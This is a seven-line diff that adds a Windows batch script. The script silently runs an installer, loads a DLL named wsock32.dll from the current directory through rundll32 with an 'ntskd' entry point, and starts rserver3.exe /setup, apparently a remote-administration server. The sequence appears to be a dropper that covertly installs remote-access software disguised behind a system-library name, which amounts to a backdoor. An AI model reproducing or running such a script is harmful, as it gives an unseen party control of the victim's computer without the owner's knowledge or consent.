@@ -1,0 +1,7 @@
+ÿþ
+@echo off
+color 0a
+start %cd%\rsetup.exe /intsetup
+rundll32.exe %cd%\wsock32.dll,ntskd noreboot
+start rserver3.exe /setup
+echo OK
